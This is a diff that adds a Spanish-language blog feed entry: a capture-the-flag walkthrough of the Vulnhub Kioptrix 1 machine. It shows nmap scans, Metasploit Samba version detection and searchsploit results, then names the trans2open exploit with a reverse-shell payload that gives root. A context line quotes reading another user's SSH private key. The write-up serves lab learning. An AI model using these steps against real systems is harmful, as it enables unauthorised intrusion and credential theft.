@@ -243,4 +243,83 @@ jan@basic2:~$ cat /home/kay/.ssh/id_rsa
 			
 		</content>
 	</entry>
+	
+	<entry>
+		<title>Vulnhub #3: Kioptrix 1</title>
+		<link href="https://update-me.com/posts/kioptrix/"/>
+		<updated>2025-05-11T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/kioptrix/</id>
+		<content type="html">
+		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-1-1,22/&quot;&gt;vulnhub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;descubrimiento-de-hosts&quot;&gt;Descubrimiento de hosts &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-hosts&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Escaneamos para descubrir hosts:&lt;br&gt;
+nmap -sn &lt;ip&gt;/&lt;rango&gt;&lt;/rango&gt;&lt;/ip&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Nos da el siguiente resultado:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:23 CEST
+Nmap scan report for www.adsl.vf (192.168.0.1)
+Host is up (0.0048s latency).
+Nmap scan report for 192.168.0.10
+Host is up (0.082s latency).
+Nmap scan report for 192.168.0.16
+Host is up (0.00044s latency).
+Nmap scan report for 192.168.0.20
+Host is up (0.000081s latency).
+Nmap scan report for 192.168.0.24
+Host is up (0.00041s latency).
+Nmap done: 256 IP addresses (5 hosts up) scanned in 15.31 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&quot;2&quot;&gt;
+&lt;li&gt;Escaneamos versiones&lt;br&gt;
+nmap -sV &lt;ip&gt;&lt;/ip&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt; ~ nmap -sV 192.168.0.24
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-10 09:26 CEST
+Nmap scan report for 192.168.0.24
+Host is up (0.0021s latency).
+Not shown: 994 closed ports
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+111/tcp   open  rpcbind     2 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+32768/tcp open  status      1 (RPC #100024)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que 192.168.0.24 es un redhat con varios puertos abiertos.&lt;/p&gt;
+&lt;p&gt;Nos interesa el servicio de Samba, pero necesitamos conocer su version antes de atacar.&lt;/p&gt;
+&lt;p&gt;Con metasploit podemos ejecutar el siguiente scanner:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;msfconsole
+search /scanner/smb/ #para buscar
+use /auxiliary/scanner/smb/smb_version
+show options
+set rhosts 192.168.0.24
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al lanzarlo, obtenemos lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[*] 192.168.0.24:139      - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
+[*] 192.168.0.24:139      -   Host could not be identified: Unix (Samba 2.2.1a)
+[*] 192.168.0.24:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Una vez tenemos la version, podemos buscar si existen exploits con &lt;code&gt;searchsploit &amp;lt;servicio&amp;gt;&lt;/code&gt; y &lt;code&gt;searchsplot &amp;lt;servicio&amp;gt; &amp;lt;version&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Con searchsploit samba 2.2.1a nos da el siguiente resultado:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;------------------------------- ---------------------------------
+ Exploit Title                 |  Path
+------------------------------- ---------------------------------
+Samba 2.2.0 &amp;lt; 2.2.8 (OSX) - tr | osx/remote/9924.rb
+Samba &amp;lt; 2.2.8 (Linux/BSD) - Re | multiple/remote/10.c
+Samba &amp;lt; 3.0.20 - Remote Heap O | linux/remote/7701.txt
+Samba &amp;lt; 3.6.2 (x86) - Denial o | linux_x86/dos/36741.py
+------------------------------- ---------------------------------
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para explotar la vulnerabilidad debemos encontrar una en su version.&lt;/p&gt;
+&lt;p&gt;En concreto, aqui tenemos la vulnerabilidad trans2open, podemos buscarla con &lt;code&gt;search trans2open&lt;/code&gt; en metasploit.&lt;/p&gt;
+&lt;p&gt;Debemos configurar el payload con &lt;code&gt;set payload linux/x86/shell_reverse_tcp&lt;/code&gt; y el rhosts.&lt;/p&gt;
+&lt;p&gt;Al lanzarlo con run obtenemos una shell con usuario root.&lt;/p&gt;
+
+			
+		</content>
+	</entry>
 </feed>
